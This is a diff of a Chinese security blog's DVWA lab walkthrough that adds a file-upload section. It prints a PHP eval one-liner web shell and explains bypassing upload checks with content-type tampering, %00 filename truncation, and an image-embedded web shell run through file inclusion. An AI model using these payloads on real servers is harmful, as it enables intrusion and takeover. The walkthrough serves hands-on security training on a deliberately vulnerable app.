@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>DVWA练习 · Specter&#39;s Blog</title>
+    <title>DVWA练习 · Specter&#39; blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">4.6k</span>阅读时长: <span class="post-count reading-time">21 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">5.7k</span>阅读时长: <span class="post-count reading-time">26 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -404,7 +404,7 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一个小型靶场。</p>
-<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><h4 id="DVWA-Security：low"><a href="#DVWA-Security：low" class="headerlink" title="DVWA Security：low"></a>DVWA Security：low</h4><p>这题的名字是爆破，那我们就爆破一下试试</p>
+<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><h4 id="DVWA-Security：low"><a href="#DVWA-Security：low" class="headerlink" title="DVWA Security：low"></a>DVWA Security：low</h4><p>这题的名字是爆破，那我们就爆破一下试试<a id="more"></a></p>
 <p>先随便提交一个密码和用户名，打开代理，bp抓包</p>
 <p><img src="https://s2.ax1x.com/2019/10/03/uwBjbR.png" alt="uwBjbR.png"></p>
 <p>然后，发送到Intruder模块，进行如下设置</p>
@@ -545,7 +545,46 @@ height:50vh;
 <p>看似安全，但是可以利用file协议来读取文件</p>
 <p><code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file://F:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></p>
 <p><img src="https://s2.ax1x.com/2019/10/08/uhN4Z6.png" alt="uhN4Z6.png"></p>
-<h3 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4>
+<h3 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h3><p> 即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。 </p>
+<h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">	<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">		<span class="comment">// No</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Yes!</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> basename() 函数返回路径中的文件名部分。 </p>
+</blockquote>
+<p> 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 </p>
+<p>所以，直接上传一个php马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span>($_POST[<span class="string">'hack'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXaYnO.png" alt="KXaYnO.png"></p>
+<p>上传成功并且返回了文件路径，</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXdA5d.png" alt="KXdA5d.png"></p>
+<p>尝试访问，是一个空白界面，但是确实是有这个界面的。</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXd9KK.png" alt="KXd9KK.png"></p>
+<p>上菜刀</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KX0dN4.png" alt="KX0dN4.png"></p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KX0RED.png" alt="KX0RED.png"></p>
+<p>成功拿到shell</p>
+<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p> medium代码中要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB） </p>
+<p>用burpsuite抓包更改一下文件类型即可。（也可以上传一个shell.jpg，然后抓包修改为shell.php）</p>
+<p> 在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXrcD0.png" alt="KXrcD0.png"></p>
+<p>成功上传，再次使用菜刀连接即可。</p>
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">	$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p> substr() 函数返回字符串的一部分。 </p>
+<p> strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     //找到“php”第一次出现的位置</span><br><span class="line">echo strrpos(&quot;I love php, I love php too!&quot;,&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> strtolower将字符串中所有的字母字符转换为小写并返回。 </p>
+<p> getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 </p>
+<p>high的代码相当于一个白名单，只允许上传.jpg、.png、.jpeg后缀文件，文件大小小于100000。</p>
+<p>所以，我们需要制作一个图片马，制作方法如下：</p>
+<p>首先，找一个正常的图片test.jpg，然后再加上上面那样的php一句话木马，在cmd输入<code>copy test.jpg/b + shell.php/a picshell.jpg</code></p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KjlJN6.png" alt="KjlJN6.png"></p>
+<p>得到的picshell.jpg文件中</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KjlsEt.png" alt="KjlsEt.png"></p>
+<p>可以看到木马已经写进来了，可以上传了。</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KjJQTs.png" alt="KjJQTs.png"></p>
+<p>直接上菜刀的话是不行的，因为这个文件不会被当成php来解析。所以这里要使用文件包含，文件包含有个漏洞，就是它不会识别是不是php文件，只要你使用了文件包含，它都会来当成php来解析，所以图片马就可被解析。</p>
+<p> <code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file:///F:/phpstudy/PHPTutorial/WWW/DVWA/hackable/uploads/picshell.jpg</code></p>
+
     </article>
     <!-- license  -->
     
@@ -553,13 +592,18 @@ height:50vh;
             <p>原文作者：<a href="https://specters.top">Specter</a>
             </p><p>原文链接：<a href="https://specters.top/2019/10/03/DVWA练习/">https://specters.top/2019/10/03/DVWA练习/</a>
             </p><p>发表日期：<a href="https://specters.top/2019/10/03/DVWA练习/">October 3rd 2019, 9:29:16 am</a>
-            </p><p>更新日期：<a href="https://specters.top/2019/10/03/DVWA练习/">October 8th 2019, 9:01:13 pm</a>
+            </p><p>更新日期：<a href="https://specters.top/2019/10/03/DVWA练习/">November 3rd 2019, 10:05:09 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/10/11/docker入门/" title="docker入门">
+                    <div class="nextTitle">docker入门</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -597,13 +641,13 @@ height:50vh;
     
         
             
-                <a href="mailto:172955365@qq.com" class="iconfont-archer email" title="email"></a>
+                <a href="mailto:specters@aliyun.com" class="iconfont-archer email" title="email"></a>
             
         
     
         
             
-                <a href="//github.com" class="iconfont-archer github" target="_blank" title="github"></a>
+                <a href="//github.com/Specterfast" class="iconfont-archer github" target="_blank" title="github"></a>
             
         
     
@@ -685,7 +729,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：low"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：medium"><span class="toc-number">2.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：high"><span class="toc-number">2.3.</span> <span class="toc-text">DVWA Security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：low-1"><span class="toc-number">3.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：medium-1"><span class="toc-number">3.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：high-1"><span class="toc-number">3.3.</span> <span class="toc-text">DVWA Security：high</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：impossible"><span class="toc-number">3.4.</span> <span class="toc-text">DVWA Security：impossible</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Cross-site-request-forgery"><span class="toc-number">4.</span> <span class="toc-text">CSRF(Cross-site request forgery)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security-low"><span class="toc-number">4.1.</span> <span class="toc-text">DVWA security:low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security：medium"><span class="toc-number">4.2.</span> <span class="toc-text">DVWA security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security：high"><span class="toc-number">4.3.</span> <span class="toc-text">DVWA security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">5.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">5.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium"><span class="toc-number">5.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high"><span class="toc-number">5.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-upload"><span class="toc-number">6.</span> <span class="toc-text">file upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-1"><span class="toc-number">6.1.</span> <span class="toc-text">low</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：low"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：medium"><span class="toc-number">2.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：high"><span class="toc-number">2.3.</span> <span class="toc-text">DVWA Security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：low-1"><span class="toc-number">3.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：medium-1"><span class="toc-number">3.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：high-1"><span class="toc-number">3.3.</span> <span class="toc-text">DVWA Security：high</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security：impossible"><span class="toc-number">3.4.</span> <span class="toc-text">DVWA Security：impossible</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Cross-site-request-forgery"><span class="toc-number">4.</span> <span class="toc-text">CSRF(Cross-site request forgery)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security-low"><span class="toc-number">4.1.</span> <span class="toc-text">DVWA security:low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security：medium"><span class="toc-number">4.2.</span> <span class="toc-text">DVWA security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security：high"><span class="toc-number">4.3.</span> <span class="toc-text">DVWA security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">5.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">5.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium"><span class="toc-number">5.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high"><span class="toc-number">5.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-upload"><span class="toc-number">6.</span> <span class="toc-text">file upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-1"><span class="toc-number">6.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium-1"><span class="toc-number">6.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-1"><span class="toc-number">6.3.</span> <span class="toc-text">high</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1568,9 +1612,124 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 56
+        Total : 61
         </div>
         <!-- search  -->
         
@@ -1583,6 +1742,31 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href="/2019/11/15/Geek-2019-web复现/">Geek_2019_web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2019/10/16/条件竞争/">条件竞争</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2019/10/16/绕过非英文字母和数字getshell/">绕过非英文字母和数字getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href="/2019/10/14/不知列名SQL注入/">不知列名SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span><a class="archive-post-title" href="/2019/10/11/docker入门/">docker入门</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1726,12 +1910,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之盲注/">SQL注入之盲注</a>
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之双查询注入/">SQL注入之双查询注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之双查询注入/">SQL注入之双查询注入</a>
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之盲注/">SQL注入之盲注</a>
         </li>
     
     
@@ -1790,12 +1974,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/CUMT双月赛一/">CUMT-12月月赛</a>
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/Bugku-Web-WriteUp/">Bugku_Web_WriteUp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/Bugku-Web-WriteUp/">Bugku_Web_WriteUp</a>
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/CUMT双月赛一/">CUMT-12月月赛</a>
         </li>
     
     
@@ -1878,33 +2062,39 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+        <span class="sidebar-tag-name" data-tags="BWVS靶场搭建"><span class="iconfont-archer">&#xe606;</span>BWVS靶场搭建</span>
     
-        <span class="sidebar-tag-name" data-tags="动态规划"><span class="iconfont-archer">&#xe606;</span>动态规划</span>
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="BWVS靶场"><span class="iconfont-archer">&#xe606;</span>BWVS靶场</span>
     
         <span class="sidebar-tag-name" data-tags="0-1背包"><span class="iconfont-archer">&#xe606;</span>0-1背包</span>
     
         <span class="sidebar-tag-name" data-tags="完全背包"><span class="iconfont-archer">&#xe606;</span>完全背包</span>
     
-        <span class="sidebar-tag-name" data-tags="BWVS靶场"><span class="iconfont-archer">&#xe606;</span>BWVS靶场</span>
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
-        <span class="sidebar-tag-name" data-tags="BWVS靶场搭建"><span class="iconfont-archer">&#xe606;</span>BWVS靶场搭建</span>
-    
-        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+        <span class="sidebar-tag-name" data-tags="动态规划"><span class="iconfont-archer">&#xe606;</span>动态规划</span>
     
         <span class="sidebar-tag-name" data-tags="cumt"><span class="iconfont-archer">&#xe606;</span>cumt</span>
     
-        <span class="sidebar-tag-name" data-tags="DVWA"><span class="iconfont-archer">&#xe606;</span>DVWA</span>
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="CUMT双月赛三"><span class="iconfont-archer">&#xe606;</span>CUMT双月赛三</span>
     
         <span class="sidebar-tag-name" data-tags="cumt双月赛一"><span class="iconfont-archer">&#xe606;</span>cumt双月赛一</span>
     
-        <span class="sidebar-tag-name" data-tags="CUMT双月赛三"><span class="iconfont-archer">&#xe606;</span>CUMT双月赛三</span>
+        <span class="sidebar-tag-name" data-tags="安恒11月月赛"><span class="iconfont-archer">&#xe606;</span>安恒11月月赛</span>
+    
+        <span class="sidebar-tag-name" data-tags="DVWA"><span class="iconfont-archer">&#xe606;</span>DVWA</span>
     
         <span class="sidebar-tag-name" data-tags="物联网基础实验"><span class="iconfont-archer">&#xe606;</span>物联网基础实验</span>
     
         <span class="sidebar-tag-name" data-tags="Arduino"><span class="iconfont-archer">&#xe606;</span>Arduino</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
     
         <span class="sidebar-tag-name" data-tags="2019_ISCC"><span class="iconfont-archer">&#xe606;</span>2019_ISCC</span>
     
@@ -1914,65 +2104,65 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="TLS"><span class="iconfont-archer">&#xe606;</span>TLS</span>
     
-        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
-    
-        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
-    
         <span class="sidebar-tag-name" data-tags="php变量覆盖"><span class="iconfont-archer">&#xe606;</span>php变量覆盖</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
